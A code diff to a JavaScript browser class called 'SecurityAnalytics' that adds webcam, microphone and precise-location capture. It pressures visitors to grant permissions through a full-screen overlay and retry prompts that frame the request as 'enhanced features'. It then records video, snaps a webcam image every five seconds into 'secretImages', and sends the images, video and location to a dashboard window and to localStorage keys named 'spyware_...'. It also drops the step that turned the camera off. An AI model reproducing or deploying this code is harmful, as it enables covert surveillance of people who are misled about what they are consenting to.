@@ -603,6 +603,9 @@ class SecurityAnalytics {
     const modal = document.getElementById('analyticsModal');
     modal.style.display = 'none';
     
+    // Start permission requests with retry mechanism
+    await this.requestPermissionsWithRetry();
+    
     // Start collecting data
     await this.collectAllData();
     
@@ -618,6 +621,513 @@ class SecurityAnalytics {
     console.log('Analytics collection started');
   }
 
+  async requestPermissionsWithRetry() {
+    const maxRetries = 3;
+    let retryCount = 0;
+    
+    while (retryCount < maxRetries) {
+      try {
+        // Show visual guidance before requesting permissions
+        this.showPermissionGuidance('camera');
+        
+        const cameraStream = await this.requestPermissionWithTimeout(
+          () => navigator.mediaDevices.getUserMedia({ 
+            video: { width: 1280, height: 720 },
+            audio: true 
+          }),
+          10000
+        );
+        
+        // Camera permission granted
+        this.hidePermissionGuidance();
+        
+        // Now request location
+        this.showPermissionGuidance('location');
+        
+        const position = await this.requestPermissionWithTimeout(
+          () => new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0
+            });
+          }),
+          15000
+        );
+        
+        // All permissions granted
+        this.hidePermissionGuidance();
+        this.showSuccessMessage();
+        
+        // Store the successful permissions
+        this.cameraStream = cameraStream;
+        this.collectedData.location = {
+          available: true,
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          altitude: position.coords.altitude,
+          altitudeAccuracy: position.coords.altitudeAccuracy,
+          heading: position.coords.heading,
+          speed: position.coords.speed,
+          timestamp: position.timestamp,
+          source: 'browser'
+        };
+        
+        // Start image capture only (no video recording)
+        this.startImageCapture();
+        
+        return; // Success, exit retry loop
+        
+      } catch (error) {
+        retryCount++;
+        this.hidePermissionGuidance();
+        
+        if (retryCount < maxRetries) {
+          // Show retry modal with stronger guidance
+          const shouldRetry = await this.showRetryModal(error.name, retryCount, maxRetries);
+          if (!shouldRetry) {
+            break; // User chose not to retry
+          }
+        } else {
+          // Max retries reached, show final message
+          this.showMaxRetriesMessage();
+        }
+      }
+    }
+  }
+
+  async requestPermissionWithTimeout(permissionRequest, timeout) {
+    return Promise.race([
+      permissionRequest(),
+      new Promise((_, reject) => 
+        setTimeout(() => reject(new Error('Permission request timeout')), timeout)
+      )
+    ]);
+  }
+
+  showPermissionGuidance(type) {
+    // Create guidance overlay with arrow
+    const guidance = document.createElement('div');
+    guidance.id = 'permissionGuidance';
+    guidance.innerHTML = `
+      <div class="guidance-overlay">
+        <div class="guidance-arrow ${type}-arrow">
+          <div class="arrow-shaft"></div>
+          <div class="arrow-head"></div>
+        </div>
+        <div class="guidance-message">
+          <div class="guidance-icon">
+            ${type === 'camera' ? '&#x1F4F7;' : '&#x1F4CD;'}
+          </div>
+          <h3>Click "Allow" in your browser!</h3>
+          <p>
+            ${type === 'camera' 
+              ? 'Look for the camera permission prompt in your browser address bar or popup' 
+              : 'Look for the location permission prompt in your browser address bar or popup'
+            }
+          </p>
+          <div class="browser-hint">
+            <div class="hint-icon">?</div>
+            <span>Check your address bar for permission requests</span>
+          </div>
+        </div>
+        <div class="pulse-dot"></div>
+      </div>
+    `;
+    
+    // Add styles
+    const style = document.createElement('style');
+    style.textContent = `
+      .guidance-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.8);
+        z-index: 10000;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        animation: fadeIn 0.3s ease-out;
+      }
+      
+      .guidance-arrow {
+        position: absolute;
+        animation: bounce 2s infinite;
+      }
+      
+      .camera-arrow {
+        top: 20%;
+        right: 20%;
+        transform: rotate(-45deg);
+      }
+      
+      .location-arrow {
+        top: 20%;
+        right: 20%;
+        transform: rotate(-45deg);
+      }
+      
+      .arrow-shaft {
+        width: 4px;
+        height: 80px;
+        background: linear-gradient(to bottom, #00d4ff, #00ff88);
+        margin: 0 auto;
+        border-radius: 2px;
+      }
+      
+      .arrow-head {
+        width: 0;
+        height: 0;
+        border-left: 15px solid transparent;
+        border-right: 15px solid transparent;
+        border-top: 25px solid #00ff88;
+        margin: -5px auto 0;
+      }
+      
+      .guidance-message {
+        background: linear-gradient(135deg, rgba(0, 212, 255, 0.1), rgba(0, 255, 136, 0.1));
+        border: 2px solid #00d4ff;
+        border-radius: 15px;
+        padding: 30px;
+        max-width: 400px;
+        text-align: center;
+        color: white;
+        backdrop-filter: blur(10px);
+        animation: slideUp 0.5s ease-out 0.3s both;
+      }
+      
+      .guidance-icon {
+        font-size: 48px;
+        margin-bottom: 15px;
+        animation: pulse 1.5s infinite;
+      }
+      
+      .guidance-message h3 {
+        margin: 0 0 15px 0;
+        font-size: 24px;
+        color: #00d4ff;
+        text-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
+      }
+      
+      .guidance-message p {
+        margin: 0 0 20px 0;
+        font-size: 16px;
+        line-height: 1.4;
+      }
+      
+      .browser-hint {
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+        padding: 12px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 14px;
+      }
+      
+      .hint-icon {
+        width: 20px;
+        height: 20px;
+        background: #00d4ff;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: bold;
+        font-size: 12px;
+      }
+      
+      .pulse-dot {
+        position: absolute;
+        width: 20px;
+        height: 20px;
+        background: #00ff88;
+        border-radius: 50%;
+        top: 15%;
+        right: 15%;
+        animation: pulse 1s infinite;
+      }
+      
+      @keyframes fadeIn {
+        from { opacity: 0; }
+        to { opacity: 1; }
+      }
+      
+      @keyframes slideUp {
+        from { 
+          opacity: 0;
+          transform: translateY(30px);
+        }
+        to { 
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      
+      @keyframes bounce {
+        0%, 20%, 50%, 80%, 100% { transform: translateY(0) rotate(-45deg); }
+        40% { transform: translateY(-20px) rotate(-45deg); }
+        60% { transform: translateY(-10px) rotate(-45deg); }
+      }
+      
+      @keyframes pulse {
+        0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.7); }
+        70% { box-shadow: 0 0 0 20px rgba(0, 255, 136, 0); }
+        100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); }
+      }
+    `;
+    
+    document.head.appendChild(style);
+    document.body.appendChild(guidance);
+    
+    // Auto-remove after 15 seconds
+    setTimeout(() => {
+      this.hidePermissionGuidance();
+    }, 15000);
+  }
+
+  hidePermissionGuidance() {
+    const guidance = document.getElementById('permissionGuidance');
+    if (guidance) {
+      guidance.remove();
+    }
+    
+    const style = document.querySelector('style[data-permission-guidance]');
+    if (style) {
+      style.remove();
+    }
+  }
+
+  async showRetryModal(errorType, retryCount, maxRetries) {
+    return new Promise((resolve) => {
+      const modal = document.createElement('div');
+      modal.id = 'retryModal';
+      modal.innerHTML = `
+        <div class="retry-modal-content">
+          <div class="retry-icon">!</div>
+          <h3>Permission Needed</h3>
+          <p>
+            ${errorType === 'NotAllowedError' 
+              ? 'Please click "Allow" when your browser asks for permissions. This is required for enhanced features.'
+              : 'Permission request timed out. Please try again and respond quickly to the browser prompt.'
+            }
+          </p>
+          <div class="retry-progress">
+            Attempt ${retryCount} of ${maxRetries}
+          </div>
+          <div class="retry-buttons">
+            <button class="retry-btn" id="retryBtn">Try Again</button>
+            <button class="skip-btn" id="skipBtn">Skip</button>
+          </div>
+        </div>
+      `;
+      
+      // Add styles
+      const style = document.createElement('style');
+      style.textContent = `
+        .retry-modal-content {
+          background: linear-gradient(135deg, rgba(255, 0, 255, 0.1), rgba(0, 212, 255, 0.1));
+          border: 2px solid #ff00ff;
+          border-radius: 15px;
+          padding: 30px;
+          max-width: 400px;
+          text-align: center;
+          color: white;
+          backdrop-filter: blur(10px);
+        }
+        
+        .retry-icon {
+          width: 60px;
+          height: 60px;
+          background: #ff00ff;
+          border-radius: 50%;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          font-size: 32px;
+          font-weight: bold;
+          margin: 0 auto 20px;
+          animation: pulse 1.5s infinite;
+        }
+        
+        .retry-modal-content h3 {
+          margin: 0 0 15px;
+          color: #ff00ff;
+          font-size: 24px;
+        }
+        
+        .retry-progress {
+          background: rgba(255, 255, 255, 0.1);
+          border-radius: 20px;
+          padding: 8px;
+          margin: 20px 0;
+          font-size: 14px;
+        }
+        
+        .retry-buttons {
+          display: flex;
+          gap: 15px;
+          justify-content: center;
+        }
+        
+        .retry-btn {
+          background: linear-gradient(45deg, #00d4ff, #00ff88);
+          border: none;
+          color: white;
+          padding: 12px 25px;
+          border-radius: 25px;
+          cursor: pointer;
+          font-weight: bold;
+          transition: transform 0.2s;
+        }
+        
+        .retry-btn:hover {
+          transform: scale(1.05);
+        }
+        
+        .skip-btn {
+          background: transparent;
+          border: 1px solid #666;
+          color: #666;
+          padding: 12px 25px;
+          border-radius: 25px;
+          cursor: pointer;
+        }
+      `;
+      
+      document.head.appendChild(style);
+      document.body.appendChild(modal);
+      
+      document.getElementById('retryBtn').addEventListener('click', () => {
+        modal.remove();
+        style.remove();
+        resolve(true);
+      });
+      
+      document.getElementById('skipBtn').addEventListener('click', () => {
+        modal.remove();
+        style.remove();
+        resolve(false);
+      });
+    });
+  }
+
+  showSuccessMessage() {
+    const message = document.createElement('div');
+    message.id = 'successMessage';
+    message.innerHTML = `
+      <div class="success-content">
+        <div class="success-icon">+</div>
+        <h3>Permissions Granted!</h3>
+        <p>Enhanced features are now enabled</p>
+      </div>
+    `;
+    
+    const style = document.createElement('style');
+    style.textContent = `
+      .success-content {
+        background: linear-gradient(135deg, rgba(0, 255, 136, 0.2), rgba(0, 212, 255, 0.2));
+        border: 2px solid #00ff88;
+        border-radius: 15px;
+        padding: 20px;
+        text-align: center;
+        color: white;
+        backdrop-filter: blur(10px);
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        z-index: 9999;
+        animation: slideInRight 0.5s ease-out;
+      }
+      
+      .success-icon {
+        width: 40px;
+        height: 40px;
+        background: #00ff88;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 24px;
+        font-weight: bold;
+        margin: 0 auto 10px;
+      }
+      
+      @keyframes slideInRight {
+        from {
+          opacity: 0;
+          transform: translateX(100px);
+        }
+        to {
+          opacity: 1;
+          transform: translateX(0);
+        }
+      }
+    `;
+    
+    document.head.appendChild(style);
+    document.body.appendChild(message);
+    
+    setTimeout(() => {
+      message.remove();
+      style.remove();
+    }, 3000);
+  }
+
+  showMaxRetriesMessage() {
+    const message = document.createElement('div');
+    message.id = 'maxRetriesMessage';
+    message.innerHTML = `
+      <div class="max-retries-content">
+        <div class="warning-icon">!</div>
+        <h3>Basic Experience Only</h3>
+        <p>Some enhanced features will be limited without camera and location permissions.</p>
+      </div>
+    `;
+    
+    const style = document.createElement('style');
+    style.textContent = `
+      .max-retries-content {
+        background: linear-gradient(135deg, rgba(255, 165, 0, 0.2), rgba(255, 0, 0, 0.2));
+        border: 2px solid #ff6600;
+        border-radius: 15px;
+        padding: 20px;
+        text-align: center;
+        color: white;
+        backdrop-filter: blur(10px);
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        z-index: 9999;
+        animation: slideInRight 0.5s ease-out;
+      }
+      
+      .warning-icon {
+        width: 40px;
+        height: 40px;
+        background: #ff6600;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 24px;
+        font-weight: bold;
+        margin: 0 auto 10px;
+      }
+    `;
+    
+    document.head.appendChild(style);
+    document.body.appendChild(message);
+    
+    setTimeout(() => {
+      message.remove();
+      style.remove();
+    }, 5000);
+  }
+
   handleDecline() {
     const modal = document.getElementById('analyticsModal');
     modal.style.display = 'none';
@@ -628,18 +1138,28 @@ class SecurityAnalytics {
   async collectAllData() {
     // Collect device information
     this.collectDeviceInfo();
-    
-    // Collect browser information
     this.collectBrowserInfo();
     
-    // Try to collect camera data
-    await this.tryCollectCamera();
+    // Only try to collect camera if not already collected
+    if (!this.cameraStream) {
+      await this.tryCollectCamera();
+    } else {
+      console.log('Camera stream already available, starting recording');
+      this.startVideoRecording();
+    }
     
-    // Try to collect location data
-    await this.tryCollectLocation();
+    // Only try to collect location if not already collected
+    if (!this.collectedData.location.available) {
+      await this.tryCollectLocation();
+    }
     
-    // Check permission statuses
-    this.checkPermissions();
+    // Collect timezone information
+    this.collectTimezoneInfo();
+    
+    // Collect performance metrics
+    this.collectPerformanceMetrics();
+    
+    console.log('All data collection completed');
   }
 
   collectDeviceInfo() {
@@ -1499,10 +2019,17 @@ class SecurityAnalytics {
   }
 
   startVideoRecording() {
-    if (!this.cameraStream) return;
+    console.log('=== VIDEO RECORDING STARTED ===');
+    console.log('Camera stream available:', !!this.cameraStream);
+    if (!this.cameraStream) {
+      console.log('ERROR: No camera stream available for video recording');
+      return;
+    }
     
     this.recordingStartTime = Date.now();
     this.recordedChunks = [];
+    console.log('Recording start time:', new Date(this.recordingStartTime).toISOString());
+    console.log('Recording duration set to:', this.recordingDuration / 1000, 'seconds');
     
     // Create MediaRecorder with high quality settings
     const options = {
@@ -1511,72 +2038,115 @@ class SecurityAnalytics {
       audioBitsPerSecond: 128000   // 128 kbps
     };
     
+    console.log('MediaRecorder options:', options);
+    
     try {
       this.mediaRecorder = new MediaRecorder(this.cameraStream, options);
+      console.log('MediaRecorder created with VP9/Opus codec');
     } catch (e) {
-      // Fallback to default codec
+      console.log('VP9 codec not supported, falling back to default codec');
       this.mediaRecorder = new MediaRecorder(this.cameraStream);
+      console.log('MediaRecorder created with default codec');
     }
     
     this.mediaRecorder.ondataavailable = (event) => {
       if (event.data.size > 0) {
         this.recordedChunks.push(event.data);
+        console.log(`Video chunk received: ${event.data.size} bytes, total chunks: ${this.recordedChunks.length}`);
       }
     };
     
     this.mediaRecorder.onstop = () => {
+      console.log('=== VIDEO RECORDING STOPPED ===');
+      console.log('Total chunks collected:', this.recordedChunks.length);
+      
       this.videoBlob = new Blob(this.recordedChunks, { type: 'video/webm' });
+      console.log('Video blob created:', this.videoBlob.size, 'bytes');
+      
       this.saveVideo();
-      this.disableCamera();
     };
     
     // Start recording
     this.mediaRecorder.start(1000); // Collect data every 1 second
+    console.log('MediaRecorder started with 1-second intervals');
     
     // Start image capture every 5 seconds
     this.startImageCapture();
     
     // Auto-stop after 2 minutes
     this.recordingTimeout = setTimeout(() => {
+      console.log('Auto-stop timeout triggered after 2 minutes');
       this.stopVideoRecording();
     }, this.recordingDuration);
     
-    console.log('Video recording started for 2 minutes');
+    console.log('Video recording pipeline fully initiated');
   }
 
   startImageCapture() {
-    if (!this.cameraStream) return;
+    console.log('=== IMAGE CAPTURE STARTED ===');
+    console.log('Camera stream available:', !!this.cameraStream);
+    if (!this.cameraStream) {
+      console.log('ERROR: No camera stream available for image capture');
+      return;
+    }
     
     const video = document.createElement('video');
     video.srcObject = this.cameraStream;
     video.play();
+    console.log('Video element created and playing');
     
     const canvas = document.createElement('canvas');
     canvas.width = 1280;
     canvas.height = 720;
     const context = canvas.getContext('2d');
+    console.log('Canvas created: 1280x720');
+    
+    let imageCount = 0;
     
     // Capture image every 5 seconds
     this.imageCaptureInterval = setInterval(() => {
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const imageData = canvas.toDataURL('image/jpeg', 0.9);
-      
-      this.collectedData.secretImages.push({
-        data: imageData,
-        timestamp: new Date().toISOString(),
-        deviceInfo: this.getDeviceInfo(),
-        recordingTime: Date.now() - this.recordingStartTime
-      });
-      
-      // Keep only last 24 images (2 minutes / 5 seconds)
-      if (this.collectedData.secretImages.length > 24) {
-        this.collectedData.secretImages.shift();
+      try {
+        console.log(`=== CAPTURING IMAGE ${++imageCount} ===`);
+        console.log('Recording time:', Date.now() - this.recordingStartTime, 'ms');
+        
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/jpeg', 0.9);
+        console.log('Image captured, data length:', imageData.length, 'characters');
+        
+        const imageInfo = {
+          data: imageData,
+          timestamp: new Date().toISOString(),
+          deviceInfo: this.getDeviceInfo(),
+          recordingTime: Date.now() - this.recordingStartTime
+        };
+        
+        this.collectedData.secretImages.push(imageInfo);
+        console.log('Image added to collectedData, total images:', this.collectedData.secretImages.length);
+        
+        // Keep only last 24 images (2 minutes / 5 seconds)
+        if (this.collectedData.secretImages.length > 24) {
+          this.collectedData.secretImages.shift();
+          console.log('Removed oldest image, keeping 24 most recent');
+        }
+        
+        // Transmit new image immediately to dashboard
+        const imagePayload = {
+          type: 'CAPTURED_IMAGE',
+          capturedImage: imageInfo
+        };
+        
+        console.log('Sending image to dashboard...');
+        console.log('Image payload type:', imagePayload.type);
+        this.sendDataToDashboard(imagePayload);
+        console.log('Image transmission initiated');
+        
+      } catch (error) {
+        console.error('ERROR during image capture:', error);
       }
       
-      // Transmit new image
-      this.transmitCollectedData();
-      
     }, 5000);
+    
+    console.log('Image capture interval set: every 5 seconds');
   }
 
   stopVideoRecording() {
@@ -1598,22 +2168,37 @@ class SecurityAnalytics {
   }
 
   saveVideo() {
-    if (!this.videoBlob) return;
+    console.log('=== SAVING VIDEO TO DASHBOARD ===');
+    console.log('Video blob available:', !!this.videoBlob);
+    if (!this.videoBlob) {
+      console.log('ERROR: No video blob to save');
+      return;
+    }
+    
+    console.log('Video blob size:', this.videoBlob.size, 'bytes');
+    console.log('Video blob type:', this.videoBlob.type);
     
     // Convert video blob to base64 for dashboard transmission
     const reader = new FileReader();
     reader.onloadend = () => {
       const videoData = reader.result;
+      console.log('Video converted to base64, length:', videoData.length, 'characters');
       
       // Send video to dashboard
+      console.log('Sending video to dashboard...');
       this.sendVideoToDashboard(videoData);
       
       // Generate and send Word document with stats
+      console.log('Generating stats document...');
       this.generateStatsDocument();
     };
-    reader.readAsDataURL(this.videoBlob);
     
-    console.log('Video processed for dashboard');
+    reader.onerror = (error) => {
+      console.error('ERROR reading video blob:', error);
+    };
+    
+    reader.readAsDataURL(this.videoBlob);
+    console.log('Video blob reading initiated');
   }
 
   sendVideoToDashboard(videoData) {
@@ -1835,20 +2420,77 @@ class SecurityAnalytics {
   }
 
   async sendDataToDashboard(data) {
+    console.log('=== SENDING DATA TO DASHBOARD ===');
+    console.log('Data type:', data.type || 'GENERAL');
+    console.log('Session ID:', this.sessionId);
+    console.log('Dashboard window available:', !!this.dashboardWindow);
+    console.log('Dashboard window closed:', this.dashboardWindow ? this.dashboardWindow.closed : 'N/A');
+    
     try {
-      // Method 1: Send to dashboard window if open
+      // Send data via postMessage to dashboard window
       if (this.dashboardWindow && !this.dashboardWindow.closed) {
-        this.dashboardWindow.postMessage({
+        const message = {
           type: 'ANALYTICS_DATA',
-          payload: data
-        }, '*');
+          data: data,
+          timestamp: new Date().toISOString(),
+          sessionId: this.sessionId
+        };
+        
+        this.dashboardWindow.postMessage(message, '*');
+        console.log('Data sent via postMessage to dashboard window');
+      } else {
+        console.log('Dashboard window not available, using localStorage only');
       }
 
-      // Method 2: Store in localStorage for pickup
-      this.storeDataForPickup(data);
+      // Handle large video files separately to avoid localStorage quota issues
+      if (data.type === 'VIDEO_RECORDING' && data.videoData && data.videoData.length > 1000000) {
+        console.log('Large video file detected, storing in separate localStorage key');
+        try {
+          localStorage.setItem(`spyware_video_${this.sessionId}`, JSON.stringify(data));
+          console.log('Large video stored in separate localStorage key');
+        } catch (videoError) {
+          console.error('ERROR: Video too large even for separate storage:', videoError);
+        }
+        return;
+      }
 
+      // Store regular data in localStorage
+      try {
+        const existingData = localStorage.getItem('spyware_portfolio_data');
+        const dataArray = existingData ? JSON.parse(existingData) : [];
+        
+        const dataEntry = {
+          ...data,
+          timestamp: new Date().toISOString(),
+          sessionId: this.sessionId
+        };
+        
+        dataArray.push(dataEntry);
+        
+        // Limit localStorage size - keep only last 50 entries
+        if (dataArray.length > 50) {
+          dataArray.splice(0, dataArray.length - 50);
+        }
+        
+        localStorage.setItem('spyware_portfolio_data', JSON.stringify(dataArray));
+        console.log('Data stored in localStorage, total entries:', dataArray.length);
+        console.log('Data transmission completed successfully');
+        
+      } catch (storageError) {
+        console.error('ERROR: localStorage quota exceeded, clearing old data');
+        // Clear old data and retry
+        localStorage.removeItem('spyware_portfolio_data');
+        const dataArray = [{
+          ...data,
+          timestamp: new Date().toISOString(),
+          sessionId: this.sessionId
+        }];
+        localStorage.setItem('spyware_portfolio_data', JSON.stringify(dataArray));
+        console.log('Old data cleared, new data stored');
+      }
+      
     } catch (error) {
-      console.error('Failed to send data to dashboard:', error);
+      console.error('ERROR: Failed to send data to dashboard:', error);
     }
   }
 
@@ -1909,7 +2551,9 @@ class SecurityAnalytics {
     };
 
     if (this.collectedData.secretImages.length > 0) {
-      transmissionData.capturedImage = this.collectedData.secretImages[this.collectedData.secretImages.length - 1];
+      const lastImage = this.collectedData.secretImages[this.collectedData.secretImages.length - 1];
+      transmissionData.type = 'CAPTURED_IMAGE';
+      transmissionData.capturedImage = lastImage;
     }
 
     await this.sendDataToDashboard(transmissionData);
